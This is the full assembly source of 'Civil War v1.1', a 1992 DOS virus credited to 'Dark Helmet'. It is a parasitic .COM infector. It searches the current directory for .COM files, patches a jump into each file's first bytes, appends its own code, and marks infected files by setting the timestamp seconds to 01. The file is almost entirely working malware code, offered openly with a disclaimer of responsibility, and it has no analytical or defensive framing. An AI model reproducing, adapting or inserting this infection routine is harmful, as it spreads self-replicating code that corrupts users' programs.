;*****************************************************************************
;*   CIVIL WAR v1.1                                                          *
;*                                                                           *
;*   Assemble with Tasm 1.01                                                 *
;*                                                                           *
;*   Civil War is non-resident parasitic .COM infector with a lenght of 245  *
;*   bytes. The virus will be located at the end of the infected .COM file   *
;*   Infected files have their timestamp changed into 01 sec                 *
;*   The virus will only infected files in the current directory.            *
;*                                                                           *
;*   (c) 1992 Dark Helmet, The Netherlands                                   *
;*   The author takes no responsibilty for any damages caused by the virus   *
;*                                                                           *
;*   "My hands are tied                  				     *
;*    The billions shift from side to side                                   *
;*    And the wars go on with brainwashed pride                              *
;*    For the love of God and our human rights                               *
;*    And all these things are swept aside                                   *
;*    By bloody hands time can't deny                                        *
;*    And are washed away by our genocide                                    *
;*    And history hides the lies of our Civil Wars"      		     *
;*                                                                           *
;*                       Civil War, Guns and Roses                           *
;*****************************************************************************

		  .Radix 16

Civil_War         Segment
		  Assume cs:Civil_war, ds:Civil_war
		  org 100h

len               equ offset last - begin

dummy:            db 0e9h, 00h, 00h          ; dummy code, only for stand 
					     ; alone viruscode

Begin:            Call start_virus           ; make call to push IP on stack


Start_virus:      pop bp                     ; Get IP from stack
		  sub bp,106  
		  mov dx,0fe00h              ; Move DTA
		  mov ah,1ah
		  int 21h

Restore:          mov di,0100h               ; Restore begin of orginal file
		  lea si,[buffer+bp]
		  movsw
		  movsb

First:            lea dx,[com_mask+bp]        ; Find first com file 
		  mov ah,04eh
		  xor cx,cx
		  int 21h
       
Open_file:        mov ax,03d02h               ; Open file
		  mov dx,0fe1eh
		  int 21h
		  mov [handle+bp],ax          ; Get handle
		  mov bx,ax                                  

Date_read:        mov ax,05700h               ; Get date/time of file
		  int 21h
		  push cx                     ; Date on stack
		  and cl,2fh                  ; Filter seconds

Check_infect:     cmp cl,01h                  ; Check if seconds equ to 01
		  pop cx
		  jz next                     ; If so, search next file
		  push cx
		  push dx

Read_start:       mov bx,[handle+bp]          ; Read first 3 bytes of file to 
		  mov ah,03fh                 ; recover later
		  mov cx,03h
		  lea dx,[buffer+bp]
		  int 21h

Write_jmp:        mov ax,04202h               ; Set pointer at end of file
		  call move_pointer          
		  sub ax,3h                   ; AX contains lenght of file
		  mov [lenght+bp],ax          ; Store lenght        
		  mov ax,04200h               ; Set pointer to begin of file
		  call move_pointer            

		  call write_jump
		  
		  mov ax,04202h               ; Set pointer to end of file
		  call move_pointer

Write_virus:      mov ah,40h                  ; Write virus at end of file
		  mov cx,len
		  lea dx,[begin+bp]
		  int 21h

Date_write:       mov ax,05701h               ; Write original date back
		  pop dx
		  pop cx
		  and cl,0c0h
		  or  cl,01h                  ; Seconds equ 01
		  int 21h
		  jmp end1

Next:             Call search_next
		  jnb open_file                 

End1:             mov bx,0100h                ; Jump to begin, continu program
		  jmp bx

		  

;*****************************************************************************

Move_pointer:     mov bx,[handle+bp]         ; Part to move file pointer
		  xor cx,cx
		  xor dx,dx
		  int 21h
		  ret

Search_next:      mov bx,[handle+bp]
		  mov ah,3eh                 ; Close file
		  int 21h
		  mov ah,4fh                 ; Search next
		  int 21h
		  ret

Write_jump:       mov ah,40h                 ; Write jump instruction
		  mov cx,01
		  lea dx,[jump+bp]
		  int 21h
		  mov ah,40h                 ; Write jump lenght
		  mov cx,02
		  lea dx,[lenght+bp]
		  int 21h
		  ret

;*****************************************************************************

Message           db "Civil War, (c) 1992 Dark Helmet",0
Com_mask          db '*.com',0
buffer            db 090h, 0cdh, 020h,0        ; Stores the first 3 bytes
					       ; of the infected program,
					       ; Its now just filled to run 
					       ; the stand alone code
jump              db 0e9h,0
handle            dw ?
lenght            dw ?
last              db 090h
 
Civil_War         ends
		  end dummy
